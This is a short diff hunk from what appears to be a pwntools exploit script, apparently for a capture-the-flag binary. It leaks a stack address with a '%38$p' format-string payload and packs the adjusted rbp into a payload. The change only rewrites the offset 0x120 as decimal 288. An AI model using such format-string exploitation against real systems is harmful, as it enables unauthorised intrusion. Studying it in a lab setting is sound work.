@@ -30,7 +30,7 @@ rmt.sendline('%38$p')
 
 print(rmt.recv())
 rbp = rmt.recv().decode().split('W')[0][2:]
-rbp = int(rbp, 16) - 0x120
+rbp = int(rbp, 16) - 288
 
 # payld = payld + (rbp).to_bytes(8, byteorder="big")
 payld = payld + p64(rbp)
